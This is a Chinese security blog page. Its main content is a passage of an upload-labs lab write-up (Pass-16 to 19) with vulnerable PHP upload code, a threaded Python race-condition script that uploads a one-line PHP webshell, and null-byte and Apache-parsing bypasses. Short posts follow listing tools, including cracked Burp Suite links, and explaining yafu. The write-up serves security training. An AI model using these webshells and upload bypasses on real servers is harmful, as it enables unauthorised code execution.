        $im = imagecreatefrompng($target_path);

        if($im == false){
            $msg = &quot;该文件不是png格式的图片！&quot;;
            @unlink($target_path);
        }else{
             //给新图片指定文件名
            srand(time());
            $newfilename = strval(rand()).&quot;.png&quot;;
            $newimagepath = UPLOAD_PATH.$newfilename;
            imagepng($im,$newimagepath);
            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
            $img_path = UPLOAD_PATH.$newfilename;
            @unlink($target_path);
            $is_upload = true;               
        }
    } else {
        $msg = &quot;上传出错！&quot;;
    }

}else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
    if(move_uploaded_file($tmpname,$target_path))
    {
        //使用上传的图片生成新的图片
        $im = imagecreatefromgif($target_path);
        if($im == false){
            $msg = &quot;该文件不是gif格式的图片！&quot;;
            @unlink($target_path);
        }else{
            //给新图片指定文件名
            srand(time());
            $newfilename = strval(rand()).&quot;.gif&quot;;
            $newimagepath = UPLOAD_PATH.$newfilename;
            imagegif($im,$newimagepath);
            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
            $img_path = UPLOAD_PATH.$newfilename;
            @unlink($target_path);
            $is_upload = true;
        }
    } else {
        $msg = &quot;上传出错！&quot;;
    }
}else{
    $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</span><br><span class="line">这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片示例。</span><br><span class="line">php图像二次渲染：</span><br><span class="line">https://blog.csdn.net/hitwangpeng/article/details/48661433</span><br><span class="line">https://blog.csdn.net/hitwangpeng/article/details/46548849  </span><br><span class="line">####0x17 Pass-17</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;</p>
<p>if(isset($_POST[‘submit’])){<br>    $ext_arr = array(‘jpg’,’png’,’gif’);<br>    $file_name = $_FILES[‘upload_file’][‘name’];<br>    $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>    $file_ext = substr($file_name,strrpos($file_name,”.”)+1);<br>    $upload_file = UPLOAD_PATH . ‘/‘ . $file_name;</p>
<pre><code>if(move_uploaded_file($temp_file, $upload_file)){
    if(in_array($file_ext,$ext_arr)){
         $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
         rename($upload_file, $img_path);
         $is_upload = true;
    }else{
        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
        unlink($upload_file);
    }
}else{
    $msg = &apos;上传出错！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。</span><br></pre></td></tr></table></figure>

<p>#!/usr/bin/env python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding:utf-8"></a>coding:utf-8</h1><p>import hackhttp<br>from multiprocessing.dummy import Pool as ThreadPool</p>
<p>def upload(lists):<br>    hh = hackhttp.hackhttp()<br>    raw = “””POST /upload-labs/Pass-17/index.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://127.0.0.1/upload-labs/Pass-17/index.php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/Pass-17/index.php</a><br>Cookie: pass=17<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: multipart/form-data; boundary=—————————6696274297634<br>Content-Length: 341</p>
<p>—————————–6696274297634<br>Content-Disposition: form-data; name=”upload_file”; filename=”17.php”<br>Content-Type: application/octet-stream</p>
<?php assert($_POST["LandGrey"])?>
<p>—————————–6696274297634<br>Content-Disposition: form-data; name=”submit”</p>
<p>上传<br>—————————–6696274297634–<br>“””<br>    code, head, html, redirect, log = hh.http(‘<a href="http://127.0.0.1/upload-labs/Pass-17/index.php&#39;" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/Pass-17/index.php&#39;</a>, raw=raw)<br>    print(str(code) + “\r”)</p>
<p>pool = ThreadPool(10)<br>pool.map(upload, range(10000))<br>pool.close()<br>pool.join()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在脚本运行的时候，访问Webshell</span><br><span class="line"></span><br><span class="line">####0x18 Pass-18</span><br></pre></td></tr></table></figure>

<p>//index.php<br>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’]))<br>{<br>    require_once(“./myupload.php”);<br>    $imgFileName =time();<br>    $u = new MyUpload($_FILES[‘upload_file’][‘name’], $_FILES[‘upload_file’][‘tmp_name’], $_FILES[‘upload_file’][‘size’],$imgFileName);<br>    $status_code = $u-&gt;upload(UPLOAD_PATH);<br>    switch ($status_code) {<br>        case 1:<br>            $is_upload = true;<br>            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;<br>            break;<br>        case 2:<br>            $msg = ‘文件已经被上传，但没有重命名。’;<br>            break;<br>        case -1:<br>            $msg = ‘这个文件不能上传到服务器的临时文件存储目录。’;<br>            break;<br>        case -2:<br>            $msg = ‘上传失败，上传目录不可写。’;<br>            break;<br>        case -3:<br>            $msg = ‘上传失败，无法上传该类型文件。’;<br>            break;<br>        case -4:<br>            $msg = ‘上传失败，上传的文件过大。’;<br>            break;<br>        case -5:<br>            $msg = ‘上传失败，服务器已经存在相同名称文件。’;<br>            break;<br>        case -6:<br>            $msg = ‘文件无法上传，文件不能复制到目标目录。’;<br>            break;<br>        default:<br>            $msg = ‘未知错误！’;<br>            break;<br>    }<br>}</p>
<p>//myupload.php<br>class MyUpload{<br>……<br>……<br>……<br>  var $cls_arr_ext_accepted = array(<br>      “.doc”, “.xls”, “.txt”, “.pdf”, “.gif”, “.jpg”, “.zip”, “.rar”, “.7z”,”.ppt”,<br>      “.html”, “.xml”, “.tiff”, “.jpeg”, “.png” );</p>
<p>……<br>……<br>……<br>  /** upload()<br>   **<br>   ** Method to upload the file.<br>   ** This is the only method to call outside the class.<br>   ** @para String name of directory we upload to<br>   ** @returns void<br>  **/<br>  function upload( $dir ){</p>
<pre><code>$ret = $this-&gt;isUploadedFile();

if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );
}

$ret = $this-&gt;setDir( $dir );
if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );
}

$ret = $this-&gt;checkExtension();
if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );
}

$ret = $this-&gt;checkSize();
if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );    
}

// if flag to check if the file exists is set to 1

if( $this-&gt;cls_file_exists == 1 ){

  $ret = $this-&gt;checkFileExists();
  if( $ret != 1 ){
    return $this-&gt;resultUpload( $ret );    
  }
}

// if we are here, we are ready to move the file to destination

$ret = $this-&gt;move();
if( $ret != 1 ){
  return $this-&gt;resultUpload( $ret );    
}

// check if we need to rename the file

if( $this-&gt;cls_rename_file == 1 ){
  $ret = $this-&gt;renameFile();
  if( $ret != 1 ){
    return $this-&gt;resultUpload( $ret );    
  }
}

// if we are here, everything worked as planned :)

return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</code></pre><p>  }<br>……<br>……<br>……<br>};</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 刚开始没有找到绕过方法，最后下载作者Github提供的打包环境，利用上传重命名竞争+Apache解析漏洞，成功绕过。</span><br><span class="line">上传名字为18.php.7Z的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。快速提交上面的数据包，可以让文件名字不被重命名上传成功，然后利用Apache的解析漏洞，即可获得shell。</span><br><span class="line">####0x19 Pass-19</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“php”,”php5”,”php4”,”php3”,”php2”,”html”,”htm”,”phtml”,”pht”,”jsp”,”jspa”,”jspx”,”jsw”,”jsv”,”jspf”,”jtml”,”asp”,”aspx”,”asa”,”asax”,”ascx”,”ashx”,”asmx”,”cer”,”swf”,”htaccess”);</p>
<pre><code>    $file_name = trim($_POST[&apos;save_name&apos;]);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空

    if(!in_array($file_ext,$deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name;
        if (move_uploaded_file($temp_file, $img_path)) { 
            $is_upload = true;
        }else{
            $msg = &apos;上传出错！&apos;;
        }
    }else{
        $msg = &apos;禁止保存为该类型文件！&apos;;
    }

} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<pre><code>* 原理同11，上传的文件名用0x00绕过。改成19.php【二进制00】.1.jpg

&gt;![](https://upload-images.jianshu.io/upload_images/9223646-de070594f1d760e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

####参考
[write_up1](https://www.cnblogs.com/bmjoker/p/9141322.html)
[write_up2](http://www.she1don.cn/index.php/archives/38.html)</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Tools/常用工具(资源)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/Tools/常用工具(资源)/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:01Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>####百度网盘加速下载<br><a href="https://www.chongbuluo.com/forum.php?mod=viewthread&tid=2749" target="_blank" rel="noopener">八种百度云盘下载加速不限速方法总结</a></p>
<p>####Parrot使用<br><a href="https://www.jianshu.com/p/cdf6b176b5dd" target="_blank" rel="noopener">ParrotSec新手全家桶——更新源/更新系统/安装VMtools/安装中文输入法</a><br><a href="https://parrotsec-cn.org/t/topic/151" target="_blank" rel="noopener">ParrotSec 中文社区</a></p>
<p>####kali<br><a href="https://jingyan.baidu.com/article/3ea51489992f1f52e71bba45.html" target="_blank" rel="noopener">Kali 2018.2 VMware tools安装</a><br><a href="https://blog.csdn.net/mars_guest/article/details/79899202" target="_blank" rel="noopener">(2018最新)Kali linux 安装中文输入法的方法</a></p>
<p>####Burpsuite</p>
<ul>
<li><a href="http://www.freebuf.com/articles/rookie/156928.html" target="_blank" rel="noopener">新手福利 | Burpsuite你可能不知道的技巧</a></li>
<li><a href="https://sourceforge.net/projects/burpunlimited/" target="_blank" rel="noopener">burpunlimited下载地址</a></li>
<li><a href="https://blog.fosec.vn/burpunlimited-just-extends-burploaders-license-d226fcb232aa" target="_blank" rel="noopener">BurpUnlimited — Just extends BurpLoader’s license(mxcx)</a><br>####弱口令库<br><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/tree/master/Passwords</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Tools/yafu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/Tools/yafu/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:01Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">下载地址</a></li>
<li>使用方式<br>1、使用cmd进入yafu的解压目录，输入yafu-x64进入命令行，最常用的命令是factor(n)，将n值分解。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factor(需要分解的大数)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>2、使用yafu的时候遇到mismatched parens<br>//这是因为在命令行里不支持过长的位数。<br>新建一个文件p.txt，内容里写上n的值，最后面一定要换行。<br>然后运行命令为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yafu-x64 &quot;factor(@)&quot; -batchfile p.txt</span><br></pre></td></tr></table></figure>

<p>注意：运行后，1.txt就会消失了<br>参考：<a href="https://www.cnblogs.com/pcat/p/7508205.html" target="_blank" rel="noopener">Pcat</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/blog-logo.jpg"
                alt="hf1dw" />
            
              <p class="site-author-name" itemprop="name">hf1dw</p>
              <p class="site-description motion-element" itemprop="description">Good habits are more important than hard work</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">60</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/hf1dw" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.jianshu.com/u/41daca7ad841" target="_blank" title="简书">
                      
                        <i class="fa fa-fw fa-heartbeat"></i></a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-[object Object]"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">©2019 by hf1dw</span>

  
</div>








        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>
